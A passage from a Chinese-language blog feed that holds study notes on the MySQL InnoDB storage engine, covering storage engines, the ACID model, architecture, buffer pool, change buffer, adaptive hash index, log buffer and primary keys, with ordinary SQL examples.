    <content type="html"><![CDATA[<div class="note quote cyan"><p>InnoDB 页格式。</p></div><span id="more"></span>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note quote cyan&quot;&gt;&lt;p&gt;InnoDB 页格式。&lt;/p&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="学习笔记" scheme="https://blog.secriy.com/categories/note/"/>
    
    
    <category term="Database" scheme="https://blog.secriy.com/tags/Database/"/>
    
    <category term="MySQL" scheme="https://blog.secriy.com/tags/MySQL/"/>
    
    <category term="InnoDB" scheme="https://blog.secriy.com/tags/InnoDB/"/>
    
  </entry>
  
  <entry>
    <title>InnoDB Row Formats</title>
    <link href="https://blog.secriy.com/undefined/"/>
    <id>https://blog.secriy.com/undefined/</id>
    <published>2021-11-01T06:10:26.000Z</published>
    <updated>2025-02-16T07:13:36.767Z</updated>
    
    <content type="html"><![CDATA[<div class="note quote cyan"><p>InnoDB 行格式。</p></div><span id="more"></span>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note quote cyan&quot;&gt;&lt;p&gt;InnoDB 行格式。&lt;/p&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="学习笔记" scheme="https://blog.secriy.com/categories/note/"/>
    
    
    <category term="Database" scheme="https://blog.secriy.com/tags/Database/"/>
    
    <category term="MySQL" scheme="https://blog.secriy.com/tags/MySQL/"/>
    
    <category term="InnoDB" scheme="https://blog.secriy.com/tags/InnoDB/"/>
    
  </entry>
  
  <entry>
    <title>The Basics of InnoDB</title>
    <link href="https://blog.secriy.com/basics-of-innodb/"/>
    <id>https://blog.secriy.com/basics-of-innodb/</id>
    <published>2021-09-21T01:17:14.000Z</published>
    <updated>2025-02-16T07:13:36.783Z</updated>
    
    <content type="html"><![CDATA[<div class="note quote cyan"><p>本文是 MySQL InnoDB 存储引擎的相关基础知识总结，主要是对 MySQL 5.7 官方文档 InnoDB 部分进行的翻译和精简，但参考了其他的相关文档（如 MariaDB）以及一些书籍和第三方资料对文章进行补充。本文翻译可能引起歧义的地方都会注明英文原文，以确保不会误导读者。另，本文仅适用于熟悉 MySQL 基本操作以及基本概念的读者。</p></div><span id="more"></span><blockquote><p>测试环境：Server version: 5.7.36-log MySQL Community Server (GPL)</p></blockquote><h2 id="MySQL-中的存储引擎"><a href="#MySQL-中的存储引擎" class="headerlink" title="MySQL 中的存储引擎"></a>MySQL 中的存储引擎</h2><p>MySQL 支持选择甚至自行开发存储引擎，这是一个插件式的体系结构，可以根据场景和需求来从各种拥有不同特性的存储引擎中选择需要的存储引擎。MySQL 中的存储引擎主要有：</p><ul><li>InnoDB</li><li>MyISAM</li><li>MEMORY</li><li>MRG_MYISAM</li><li>CSV</li><li>FEDERATED</li><li>PERFORMANCE_SCHEMA</li><li>BLACKHOLE</li><li>ARCHIVE</li></ul><blockquote><p>通过 <code>SHOW ENGINES;</code> 命令可以查看。</p></blockquote><pre><code>mysql&gt; show engines;+--------------------+---------+----------------------------------------------------------------+--------------+------+------------+| Engine             | Support | Comment                                                        | Transactions | XA   | Savepoints |+--------------------+---------+----------------------------------------------------------------+--------------+------+------------+| MEMORY             | YES     | Hash based, stored in memory, useful for temporary tables      | NO           | NO   | NO         || MRG_MYISAM         | YES     | Collection of identical MyISAM tables                          | NO           | NO   | NO         || CSV                | YES     | CSV storage engine                                             | NO           | NO   | NO         || FEDERATED          | NO      | Federated MySQL storage engine                                 | NULL         | NULL | NULL       || PERFORMANCE_SCHEMA | YES     | Performance Schema                                             | NO           | NO   | NO         || MyISAM             | YES     | MyISAM storage engine                                          | NO           | NO   | NO         || InnoDB             | DEFAULT | Supports transactions, row-level locking, and foreign keys     | YES          | YES  | YES        || BLACKHOLE          | YES     | /dev/null storage engine (anything you write to it disappears) | NO           | NO   | NO         || ARCHIVE            | YES     | Archive storage engine                                         | NO           | NO   | NO         |+--------------------+---------+----------------------------------------------------------------+--------------+------+------------+9 rows in set (0.00 sec)</code></pre><p>对于面试与日常开发，InnoDB 是必须掌握的存储引擎，但最好多了解 1 ~ 2 个存储引擎，如 MyISAM、MEMORY 等。本节将对 MySQL 中部分存储引擎做一个简略的介绍。</p><h3 id="InnoDB"><a href="#InnoDB" class="headerlink" title="InnoDB"></a>InnoDB</h3><p>InnoDB 存储引擎支持<strong>事务</strong>，支持<strong>行锁</strong>和<strong>外键</strong>。</p><p>InnoDB 通过 MVCC 来实现高并发性，并实现了四个隔离级别。InnoDB 使用 Next-Key locking 来避免幻读（phantom）。另外它还提供了诸如插入缓冲、二次写、自适应哈希索引、预读等功能来实现<strong>高性能</strong>和<strong>高可用</strong>。</p><p>在存储方面，InnoDB 采用<strong>聚集索引</strong>存放所有数据，因此所有表中数据都按照一定的顺序存放。</p><h3 id="MyISAM"><a href="#MyISAM" class="headerlink" title="MyISAM"></a>MyISAM</h3><p>MyISAM 存储引擎不支持事务，采用表锁设计，支持全文索引。</p><h2 id="InnoDB-介绍"><a href="#InnoDB-介绍" class="headerlink" title="InnoDB 介绍"></a>InnoDB 介绍</h2><blockquote><p><code>InnoDB</code> is a general-purpose storage engine that balances high reliability and high performance. In MySQL 5.7, <code>InnoDB</code> is the default MySQL storage engine. Unless you have configured a different default storage engine, issuing a <a href="https://dev.mysql.com/doc/refman/5.7/en/create-table.html"><code>CREATE TABLE</code></a> statement without an <code>ENGINE</code> clause creates an <code>InnoDB</code> table.</p><p>InnoDB 是一个平衡了高可靠性和高性能的通用存储引擎。在 MySQL 5.7 中，InnoDB 是默认的 MySQL 存储引擎。</p></blockquote><p>查看当前使用的数据库版本支持哪些存储引擎：</p><pre><code class="mysql">SHOW ENGINES;SELECT * FROM INFORMATION_SCHEMA.ENGINES;</code></pre><h3 id="InnoDB-的主要优势"><a href="#InnoDB-的主要优势" class="headerlink" title="InnoDB 的主要优势"></a>InnoDB 的主要优势</h3><ul><li>其 DML（Data Manipulation Language，数据操纵语言）操作遵循 ACID 模型，提供带有提交（commit）、回滚（rollback）、崩溃恢复（crash-recovery）能力的事务（transaction）机制。</li><li>支持行级锁（row-level locking）以及 Oracle 风格的一致读取，提高了多用户并发性和性能。</li><li>InnoDB 基于主键（primary key）在磁盘上排列数据来优化查询。每个 InnDB 表都有一个被称作<strong>聚集索引</strong>（ <em>clustered index</em> ）的主键索引去组织数据，它能够最小化主键查找的 I/O 开销。</li><li>InnoDB 支持外键约束，使用外键时会检查插入、更新和删除，以确保它们不会导致相关表之间的不一致。</li></ul><h3 id="InnoDB-和-MyISAM-的区别"><a href="#InnoDB-和-MyISAM-的区别" class="headerlink" title="InnoDB 和 MyISAM 的区别"></a>InnoDB 和 MyISAM 的区别</h3><p>InnoDB：</p><ul><li>支持 ACID 事务，支持事务的四种隔离级别</li><li>支持行级锁和外键约束，因此可以支持写并发</li><li>不存储总行数</li><li>一个 InnoDB 引擎存储在一个文件空间（共享表空间，表大小不受操作系统控制，一个表可能分布在多个文件里）也有可能为多个（设置为独立表空，表大小受操作系统文件大小限制，一般为 2G），受操作系统文件大小的限制</li><li>主键索引采用聚集索引，二级索引存储主键的值</li></ul><p>MyISAM：</p><ul><li>不支持事务，但是每次查询都是原子的</li><li>支持表级锁，即每次操作是对整个表加锁</li><li>存储表的总行数</li><li>一个 MyISAM 表有三个文件：索引文件、表结构文件、数据文件</li><li>采用非聚集索引，索引文件的数据域存储指向数据文件的指针。二级索引与主键索引基本一致，但是二级索引不用保证唯一性</li></ul><h3 id="InnoDB-最佳实践"><a href="#InnoDB-最佳实践" class="headerlink" title="InnoDB 最佳实践"></a>InnoDB 最佳实践</h3><blockquote><p>本节取自官方文档，介绍使用 InnoDB 时的最佳实践，即优化性能等方面的实践。<br>从官方提供的最佳实践能够看出一部分 InnoDB 的优势、它能够解决的问题以及它存在的问题。</p></blockquote><ul><li>使用最常查询的一列或多列为每个表指定主键，如果没有明显的主键，则为其指定自动递增值。</li><li>使用联接来从多个带有相同 ID 值的表中查询数据。为了提高联接的性能，在联接的列上定义外键，并在每个表中对这些列定义相同的数据类型。添加外键可确保引用的列被索引，从而提高性能。外键还会将删除和更新操作传递到所有其他受影响的表中，如果父表中不存在相应的 ID，则会阻止在子表中插入数据。</li><li>关闭自动提交。每秒提交数百次会降低性能（受存储设备的写入速度限制）。</li><li>使用 <code>START TRANSACTION</code> 和 <code>COMMIT</code> 语句将相关 DML 操作集合括起来，将它们分组到事务中。虽然不应该 commit 太频繁，但保留大量的未提交语句（<code>INSERT</code>，<code>UPDATE</code>，<code>DELETE</code>），让其执行数个小时也是不合适的。</li><li>不要使用 <code>LOCK TABLES</code> 语句。InnoDB 不需要牺牲可靠性和性能就可以处理多个会话并同时对同一个表进行读写。要获得对多个行的独占写入权限，请使用 <code>SELECT ... FOR UPDATE</code> 语法，这样仅会锁定要更新的行。</li><li>启用 <code>innodb_file_per_table</code> 变量或使用常规表空间，从而将表的数据和索引放入单独的文件中，而不是去使用系统表空间。默认情况下，<code>innodb_file_per_table</code> 变量处于启用状态。</li><li>评估你的数据和访问模式是否受益于 InnoDB 表或页面的压缩功能。你可以在不牺牲读/写功能的情况下压缩 InnoDB 表。</li><li>使用 <code>--sql_mode=NO_ENGINE_SUBSTITUTION</code> 选项运行服务器，以防止使用不希望使用的存储引擎创建表。</li></ul><h2 id="InnoDB-ACID-模型"><a href="#InnoDB-ACID-模型" class="headerlink" title="InnoDB ACID 模型"></a>InnoDB ACID 模型</h2><blockquote><p>The <a href="https://dev.mysql.com/doc/refman/5.7/en/glossary.html#glos_acid">ACID</a> model is a set of database design principles that emphasize aspects of reliability that are important for business data and mission-critical applications. MySQL includes components such as the <code>InnoDB</code> storage engine that adhere closely to the ACID model so that data is not corrupted and results are not distorted by exceptional conditions such as software crashes and hardware malfunctions. When you rely on ACID-compliant features, you do not need to reinvent the wheel of consistency checking and crash recovery mechanisms. In cases where you have additional software safeguards, ultra-reliable hardware, or an application that can tolerate a small amount of data loss or inconsistency, you can adjust MySQL settings to trade some of the ACID reliability for greater performance or throughput.</p><p>ACID 模型是一组数据库设计原则，强调对业务数据和任务关键型应用程序非常重要的<strong>可靠性</strong>方面。MySQL 包含 InnoDB 存储引擎等组件，这些组件与 ACID 模型紧密相连，因此数据不会被破坏，结果不会因为软件的崩溃和硬件的故障等异常情况而不正确。当你依赖与 ACID 兼容的功能时，无需重新发明一致性检查和崩溃恢复机制。如果你已经有了额外的软件保护措施、超可靠的硬件或是应用程序能够容忍少量数据丢失以及数据不一致，你可以调整 MySQL 设置，以牺牲一些 ACID 可靠性来获得更高的性能或吞吐量。</p></blockquote><p>简而言之，InnoDB 存储引擎实现了 ACID 模型来保证数据和操作的可靠性，让用户不需要进行多余的操作就能够保证可靠。并且，当用户使用了其他方式来保证可靠性时，在存储引擎层面上可以不完全遵守 ACID 来提高性能和吞吐量。先对 ACID 有一个宏观的了解，在后面对其中的特性进行学习时可以更好地理解其目的与实现。</p><ul><li><strong>A</strong>: atomicity（原子性）</li><li><strong>C</strong>: consistency（一致性）</li><li><strong>I</strong>: isolation（隔离性）</li><li><strong>D</strong>: durability（持久性）</li></ul><h3 id="Atomicity"><a href="#Atomicity" class="headerlink" title="Atomicity"></a>Atomicity</h3><p>ACID 模型的原子性方面主要涉及到 InnoDB 的事务机制，相关 MySQL 功能包括：</p><ul><li><code>autocommit</code> 设置。</li><li><code>COMMIT</code> 语句。</li><li><code>ROLLBACK</code> 语句。</li></ul><p>一致性体现在事务是可以提交或回滚的原子（atomic）工作单元。当事务对数据库进行多次更改时，提交（commit）事务时所有更改都会成功，或者回滚（rollback）事务时所有更改都会撤消。</p><h3 id="Consistency"><a href="#Consistency" class="headerlink" title="Consistency"></a>Consistency</h3><p>ACID 模型的一致性方面主要涉及 InnoDB 防止数据崩溃的内部处理。相关 MySQL 功能包括：</p><ul><li>InnoDB 的<strong>双写缓冲</strong>（ <em>doublewrite buffer</em> ）。</li><li>InnoDB 的<strong>崩溃恢复</strong>（ <em>crash recovery</em> ）机制。</li></ul><p>在每次提交或回滚之后，以及在事务进行期间，数据库始终保持一致状态。如果跨多个表更新相关数据，查询将看到所有旧值或所有新值，而不是新旧值的混合。也就是说一个事务对多个表进行了更新，另外一个新的查询不可能查询到一部分表是更新了而另一些表却没有这次更新。事务的一致性也体现在事务开始前和结束后，数据库的完整性约束不会被破坏。例如具有唯一约束的字段不会在事务结束后出现了重复。</p><h3 id="Isolation"><a href="#Isolation" class="headerlink" title="Isolation"></a>Isolation</h3><p>ACID 模型的隔离性方面主要涉及到 InnoDB 的事务机制，特别是应用于每个事务的隔离级别。相关 MySQL 功能包括：</p><ul><li><code>autocommit</code> 设置。</li><li>事务的<strong>隔离级别</strong>和 <code>SET Transaction</code> 语句。</li><li>InnoDB 锁的底层细节。</li></ul><p>多个事务在进行过程中相互保护（隔离），它们之间不能相互干扰，也不能看到彼此未提交的数据。这种隔离是通过锁（locking）机制实现的。有经验的用户可以调整隔离级别，在确保事务不会相互干扰的情况下，以较少的保护换取更高的性能和并发性。</p><h3 id="Durability"><a href="#Durability" class="headerlink" title="Durability"></a>Durability</h3><p>ACID 模型的持久性方面涉及 MySQL 软件功能与特定硬件配置的交互。与 MySQL 相关的功能包括：</p><ul><li>InnoDB 的<strong>双写缓冲</strong>（ <em>doublewrite buffer</em> ）。</li><li><code>innodb_flush_log_at_trx_commit</code> 变量。</li><li><code>sync_binlog</code> 变量。</li><li><code>innodb_file_per_table</code> 变量。</li><li>存储设备（如磁盘驱动器、SSD 或 RAID 阵列）中的写入缓冲区。</li><li>存储设备中的电池供电缓存。</li><li>用于运行 MySQL 的操作系统，特别是它对 <code>fsync()</code> 系统调用的支持。</li><li>不间断电源（UPS），用于保护运行 MySQL 服务器和存储 MySQL 数据的所有计算机服务器和存储设备的电源。</li><li>备份策略，例如备份的频率和类型，以及备份保留期。</li><li>对于分布式或托管数据应用程序，MySQL 服务器硬件所在的数据中心的特定特征以及数据中心之间的网络连接。</li></ul><p>持久性体现在事务的结果是持久的————一旦提交操作成功，该事务所做的更改就不会受到电源故障、系统崩溃、竞争条件或其他潜在危险的影响。持久性通常涉及到写入磁盘存储，具有一定数量的冗余，以防止写入操作期间出现电源故障或软件崩溃。（在 InnoDB 中，doublewrite 缓冲区有助于提高持久性。）</p><h2 id="InnoDB-架构"><a href="#InnoDB-架构" class="headerlink" title="InnoDB 架构"></a>InnoDB 架构</h2><p>InnoDB 的架构可以参考下图，取自 <a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-architecture.html">InnoDB Architecture</a>。</p><p><img src="/basics-of-innodb/innodb-architecture.png" class="lazyload" data-srcset="/basics-of-innodb/innodb-architecture.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="InnoDB Architecture"></p><p>可以看到其分为 <strong>In-Memory Structures</strong> 和 <strong>On-Disk Structures</strong>，也就是内存上结构和磁盘上结构。</p><p>内存中的部分，可以看到有以下几个关键结构：</p><ul><li>Adaptive Hash Index（自适应哈希索引）</li><li>Buffer Pool（缓冲池）</li><li>Change Buffer（写缓冲，国内常用译名）</li><li>Log Buffer（日志缓冲）</li></ul><p>磁盘上的部分，有以下几个关键结构：</p><ul><li>System Tablespace（系统表空间）<ul><li>InnoDB Data Dictionary（InnoDB 数据字典）</li><li>Doublewrite Buffer（双写缓冲）</li><li>Change Buffer（写缓冲）</li><li>Undo Logs（撤销日志，undo-log）</li></ul></li><li>Undo Tablespaces（撤销表空间）</li><li>Redo Log（重做日志）</li><li>General Tablespaces（通用表空间）</li><li>Temporary Tablespaces（临时表空间）</li></ul><p>内存上模块和磁盘上模块之间是由操作系统缓冲连接，含义就是内存中的内容通过操作系统缓冲区写入磁盘来进行持久化。</p><blockquote><p>注意，用户空间的缓存通常无法直接写入硬盘，必须先将其写入内核空间的缓冲区（OS Buffer），再通过 <code>fsync()</code> 系统调用将其刷新（flush）到磁盘中。</p></blockquote><p>图中的 <strong>O_DIRECT</strong> 是 <code>open()</code> 系统调用的一个 flag，指的是进行无缓冲的 I/O 操作，会绕过内核缓冲区写入磁盘。</p><h2 id="InnoDB-内存上结构"><a href="#InnoDB-内存上结构" class="headerlink" title="InnoDB 内存上结构"></a>InnoDB 内存上结构</h2><h3 id="缓冲池"><a href="#缓冲池" class="headerlink" title="缓冲池"></a>缓冲池</h3><p>缓冲池（Buffer Pool）是主存（main memory）中的一个区域，InnoDB 在访问<strong>表和索引数据</strong>时会将它们缓存在缓冲池中。缓冲池允许直接从内存访问经常使用的数据，从而加快处理速度。在专用的服务器上，高达 80% 的物理内存通常分配给了缓冲池。</p><blockquote><p>由于 CPU 速度与磁盘 I/O 速度差别巨大，基于磁盘的数据库系统通常使用缓冲池技术来提高数据库的整体性能。</p></blockquote><p>为了提高大容量读取操作的效率，缓冲池被划分为可能容纳多行（rows，即行记录）的页面。为了提高缓存（cache）管理的效率，缓冲池被实现为页面的链表。很少使用的数据会使用 LRU 算法的变体从缓存中过时。</p><blockquote><p>注意，是 LRU 算法的变体，而非一般的 LRU 算法。</p></blockquote><p>缓冲池简单来说就是一块内存区域，在数据库读取页时，首先将找到的页放到缓冲池中。当下一次查询相同的页时，会先判断页是否在缓冲池中，若存在则直接读取该页，否则读取磁盘中的页。</p><p>缓冲池中缓存的并不只有索引页、数据页，还会包含少部分的其他内容（如 Change Buffer 等）。</p><h4 id="缓冲池的配置"><a href="#缓冲池的配置" class="headerlink" title="缓冲池的配置"></a>缓冲池的配置</h4><p>可以配置缓冲池的各个方面以提高性能。</p><ul><li><p>理想情况下，要给缓冲池的大小设置为尽可能大的值，并保证给服务器上的其他进程留下足够大的内存空间。缓冲池越大，InnoDB 就越像内存数据库，从磁盘读取数据一次，然后在后续读取期间从内存访问数据。</p></li><li><p>在内存空间充足的 64 位系统上，可以将缓冲池拆分为多个部分，以最大程度地减少并发操作之间对 InnoDB 内存结构的争用。</p><blockquote><p>即设置多个缓冲池实例（instance）来增加数据库的并发处理能力。每个页根据哈希值平均分配到不同的缓冲池实例中。</p></blockquote></li><li><p>可以将经常访问的数据一直保留在内存中，而不管某些操作的活动突然激增（这些操作会将大量不常访问的数据带入缓冲池）。</p></li><li><p>可以控制<strong>如何</strong>以及<strong>何时</strong>执行预读请求从而以异步的方式将<strong>预期很快就会使用到的页面</strong>预取到缓冲池中。</p></li><li><p>可以控制何时发生<strong>后台刷新</strong>（将缓冲池内数据持久化到磁盘）以及是否根据工作负载动态调整刷新速率。</p></li><li><p>可以配置 InnoDB 如何保留当前缓冲池状态以避免服务器重新启动后的长时间预热（warmup，指的是服务器重启后的准备步骤）。</p></li></ul><h4 id="缓冲池的监控"><a href="#缓冲池的监控" class="headerlink" title="缓冲池的监控"></a>缓冲池的监控</h4><p>可以使用 InnoDB 标准监视器（InnoDB Standard Monitor）监视缓冲池信息：</p><p><code>SHOW ENGINE InnoDB STATUS;</code></p><blockquote><p>注意：该命令显示的并非实时状态，而是过去的某一时间点的状态，从开头的信息中可以看到类似 <code>Per second averages calculated from the last 33 seconds</code> 的一段文字，在本例中表示数据取自过去 33 秒的平均值。</p></blockquote><pre><code>----------------------BUFFER POOL AND MEMORY----------------------Total large memory allocated 8585216Dictionary memory allocated 112577Buffer pool size   512Free buffers       258Database pages     254Old database pages 0Modified db pages  0Pending reads      0Pending writes: LRU 0, flush list 0, single page 0Pages made young 0, not young 00.00 youngs/s, 0.00 non-youngs/sPages read 277, created 34, written 360.00 reads/s, 0.00 creates/s, 0.00 writes/sNo buffer pool page gets since the last printoutPages read ahead 0.00/s, evicted without access 0.00/s, Random read ahead 0.00/sLRU len: 254, unzip_LRU len: 0I/O sum[0]:cur[0], unzip sum[0]:cur[0]</code></pre><blockquote><p>相关指标的详细信息参见 <a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-buffer-pool.html">Buffer Pool</a>。</p></blockquote><h3 id="写缓冲"><a href="#写缓冲" class="headerlink" title="写缓冲"></a>写缓冲</h3><blockquote><p>在 MySQL 5.5 之前的版本中，由于只支持缓存 <code>INSERT</code> 操作，所以叫做插入缓冲（Insert Buffer）。后来的版本中支持了 <code>INSERT</code>、<code>UPDATE</code> 和 <code>DELETE</code> 操作类型缓冲，因此改叫写缓冲。</p></blockquote><p>写缓冲（Change Buffer）是一种特殊的数据结构，当<strong>二级索引</strong>页不在缓冲池（即前一小节的 Buffer Pool）中时，它会缓存这些页的更改。缓存的更改可能由 <code>INSERT</code>、<code>UPDATE</code> 或 <code>DELETE</code> 操作（DML）导致，稍后当页面通过其他读操作加载到缓冲池时，会合并这些更改。</p><p><img src="/basics-of-innodb/innodb-change-buffer.png" class="lazyload" data-srcset="/basics-of-innodb/innodb-change-buffer.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="Change Buffer"></p><p>与聚集索引不同（聚集索引<strong>在大多数情况下</strong>插入是按顺序的，因此操作速度很快），二级索引通常是非唯一的，二级索引的插入顺序相对随机，需要进行随机 I/O 读写，也就是说开销会更大。同样地，删除和更新可能会影响索引树中不相邻的二级索引页。当其他操作将受影响的页面读入缓冲池时，合并（merging）缓存的更改，可避免从磁盘将二级索引页面读入缓冲池所需的大量随机访问 I/O。简而言之就是用写缓冲的机制让二级索引的 DML 修改结果先不存入磁盘，而是缓存起来，等到下次读这个数据的时候合并写缓冲缓存的修改再返回给用户。使用这种机制能够大大降低磁盘 I/O 开销。</p><p>当系统大部分处于闲置状态或处在缓慢停机期间会进行 <em>purge</em> 操作，将写缓冲上的更新写入到磁盘。和立即将每个新值写入磁盘相比，purge 操作可以更有效地将一批索引值写入磁盘块。</p><p>当有许多受影响的行以及很多的二级索引项需要更新时，写缓冲区的合并（merging）操作可能需要几个小时。在此期间，磁盘 I/O 会增加，这可能会导致需要读磁盘的查询速度显著降低。提交事务后，甚至在服务器关闭并重新启动后，写缓冲区合并也可能继续进行。</p><p>在内存中，写缓冲区占用了缓冲池的一部分。在磁盘上，写缓冲区是系统表空间的一部分，当数据库服务器关闭时，索引更改将在其中进行缓冲，即写缓冲区在磁盘上也存在，断电仍能够恢复。</p><p>缓存在写缓冲区中的数据类型由 <code>innodb_change_buffering</code> 变量控制。</p><blockquote><p>注意：写缓冲只会缓存对<strong>二级索引</strong>的更改。并且，对唯一索引（unique index）的更改并不会缓存其主键，因为 InnoDB 需要进行唯一性校验，这必须通过读磁盘来进行。也就是说，对于唯一索引，不管怎样都要进行磁盘 I/O，没有什么缓存的必要。</p></blockquote><h3 id="自适应哈希索引"><a href="#自适应哈希索引" class="headerlink" title="自适应哈希索引"></a>自适应哈希索引</h3><p>自适应哈希索引（Adaptive Hash Index, AHI）使 InnoDB 能够在具有<strong>适当的工作负载组合</strong>和<strong>足够的缓冲池内存</strong>的系统上执行得更像内存数据库，而不会牺牲事务特性或可靠性。AHI 由 <code>innodb_adaptive_hash_index</code> 变量启用，或在服务器启动时由 <code>--skip-innodb-adaptive-hash-index</code> 关闭（默认开启 AHI）。</p><blockquote><p>哈希查找在理想情况下的查找时间复杂度为 $O(1)$，查询效率要高于 B+ 树。</p></blockquote><p>AHI 根据观察到的搜索模式，使用索引键的前缀构建哈希索引。前缀可以是任意长度，也可能只有 B+ 树中的某些值出现在哈希索引中。哈希索引是针对经常访问的索引页面按需构建的。</p><p>如果一个表几乎完全放在主内存中，哈希索引通过启用任何元素的直接查找来加速查询，将索引值转换为某种指针。InnoDB 具有监控索引查找的机制，如果 InnoDB 注意到查询过程可以从构建哈希索引中受益，它会自动建立哈希索引，因此这个机制被称为自适应哈希索引。</p><p>在某些作业量（workloads）下，通过 AHI 查找带来的速度提升要远远超过<strong>监视索引查找</strong>和<strong>维护哈希索引结构</strong>的额外开销。也就是说这种机制能有效地提升数据查询速度。在高工作负载（heavy workloads）下，访问 AHI 有时会成为竞争（contention）源，例如多个并发连接造成的对 AHI 的竞争。并且，使用 <code>LIKE</code> 运算符和 <code>%</code> 通配符的查询往往不会从中受益。对于无法从 AHI 中受益的作业量情况，将其关闭可减少不必要的性能开销。由于很难提前预测自适应哈希索引功能是否适合特定系统和工作量，需考虑在启用和禁用它的情况下分别进行基准测试以确定是否启用。</p><p>在 MySQL 5.7 中，AHI 功能是分区的。每个索引都绑定到一个特定的分区，每个分区都由一个单独的 latch（闩锁）保护。分区机制由 <code>innodb_adaptive_hash_index_parts</code> 变量控制。在早期版本中，AHI 功能受到单个 latch 的保护，这在高工作负载下可能会成为一个竞争点。<code>innodb_adaptive_hash_index_parts</code> 变量默认设置为 8，最大可设置为 512。</p><p>可以在 <code>SHOW ENGINE INNODB STATUS</code> 输出的 <code>SEMAPHORES</code> 部分监视自适应哈希索引的使用和竞争。如果有大量线程在等待 <code>btr0sea.c</code> 中创建的 <code>rw-latches</code>，请考虑增加自适应哈希索引分区的数量或禁用自适应哈希索引。</p><h3 id="日志缓冲"><a href="#日志缓冲" class="headerlink" title="日志缓冲"></a>日志缓冲</h3><p>日志缓冲区（Log Buffer）是一块特定的内存区域，用于存储要写入磁盘的<strong>日志文件数据</strong>（仅 redo log）。</p><p>MySQL 每执行一条 DML 语句，会先将改动的记录编码后写入 Log Buffer，后续根据某些机制决定将 Log Buffer 中的内容刷新（flush）到磁盘中的 Redo Log 文件。</p><blockquote><p>redo log 是物理日志，记录的是例如在某个数据页上做了什么修改。比较而言，binlog 这种逻辑日志记录的是用户的操作，而非物理存储层面进行的操作。</p></blockquote><p>日志缓冲区大小由 <code>innodb_log_buffer_size</code> 变量定义。默认大小为 16MB。日志缓冲区的内容定期刷新（flush）到磁盘。大型日志缓冲区使大型事务能够运行，而无需在事务提交之前将重做日志（redo log）数据写入磁盘。因此，如果有更新、插入或删除多行的事务，增大日志缓冲区可以节省磁盘 I/O。</p><p><code>innodb_flush_log_at_trx_commit</code> 变量控制如何将日志缓冲区的内容写入并刷新到磁盘，有以下几种方法：</p><ul><li>0，延迟写：事务提交时不会将 Log Buffer 中的日志写入到磁盘中的 Redo Log 文件，而是每秒写入内核缓冲区，并调用 <code>fsync()</code> 写入到 Redo Log 文件中。系统崩溃时，会丢失 1 秒内的数据。</li><li>1，实时写，实时刷新：事务提交先将 Log Buffer 中的日志写入 OS Buffer 并调用 <code>fsync()</code> 刷新到 Redo Log 文件中。这种方式即使系统崩溃也不会丢失任何数据（已提交的事务不会丢失），但是因为每次提交都写入磁盘，I/O 的性能较差。</li><li>2，实时写，延迟刷新：事务提交先将 Log Buffer 中的日志写入 OS Buffer，但不立即调用 <code>fsync()</code>，每秒调用 <code>fsync()</code> 将日志写入到 Redo Log 文件中。</li></ul><blockquote><p>测试环境下，<code>innodb_flush_log_at_trx_commit</code> 默认为 1。</p></blockquote><p><code>innodb_flush_log_at_timeout</code> 变量用于控制日志刷新频率。</p><h2 id="InnoDB-磁盘上结构"><a href="#InnoDB-磁盘上结构" class="headerlink" title="InnoDB 磁盘上结构"></a>InnoDB 磁盘上结构</h2><h3 id="表"><a href="#表" class="headerlink" title="表"></a>表</h3><p>默认情况下，创建的新表是以 InnoDB 作为其存储引擎，但可以通过 <code>CREATE TABLE ... ENGINE=MyISAM;</code> 这样的语句来指定其使用的存储引擎。并且，InnoDB 默认会将 <code>innodb_file_per_table</code> 系统变量设置为 <code>ON</code>，让每个表使用单独的 <em>.frm</em> 文件（该文件为表结构文件）。</p><p>InnoDB 还会将新表的一些信息存入<strong>系统表空间</strong>中自己的内部数据字典里。当某一个表被删除时，InnoDB 同样要删除其系统表空间中和被删除表有关的记录。简而言之，InnoDB 自己维护了几个表，会将一些 InnoDB 需要的信息以及用户所创建表的相关信息存进这些表中。</p><h4 id="主键"><a href="#主键" class="headerlink" title="主键"></a>主键</h4><p>InnoDB 中，表中数据按照主键顺序组织存放，被称为<strong>索引组织表</strong>。主键决定了数据在物理存储结构（即后文中的 B+ 树索引）中的排列顺序，因此主键的选择和定义对数据库存储来说非常重要。建议为每一个表都手动定义主键，并包含以下特征：</p><ul><li>最重要的查询所用列</li><li>不可能为空的列</li><li>不会重复的列</li><li>插入后其值很少修改的列</li></ul><p>当用户建表时没有显式指定主键时，InnoDB 会首先判断表中是否有<strong>非空的唯一索引</strong>（<code>NOT NULL</code>、<code>UNIQUE</code>），如果有将该列设为主键。如果没有非空唯一索引， InnoDB 会自动创建一个隐含的 6 字节大小主键。通过 <code>_rowid</code> 字段可以查询到单列主键，但隐含主键以及联合主键无法查到，这涉及到前面提到的 [InnoDB Multi-Versioning](#InnoDB Multi-Versioning)。</p><blockquote><p>如果有多个非空唯一索引，则选择<strong>首先创建索引</strong>的那一列。注意，并非按照列顺序，而是唯一索引的创建顺序。</p></blockquote><p>尽管表在没有定义主键的情况下也能正常工作（不显式创建主键并且没有可以用作主键的列时，InnoDB 会创建一个隐含主键），但主键涉及性能的许多方面，并且是任何大型或经常使用的表的重要设计方面。建议始终在 <code>CREATE TABLE</code> 语句中指定主键。如果创建了表并装入了数据，再通过 <code>ALTER TABLE</code> 语句来添加主键，则该操作比创建表时定义主键要慢得多。</p><p>我们尝试一下创建一个带有主键的表，并随便插入几条数据。</p><pre><code class="mysql">mysql&gt; create table tbl_test_1 (    -&gt; id int not null auto_increment,    -&gt; name varchar(20) not null,    -&gt; primary key (id) # 定义主键为 id    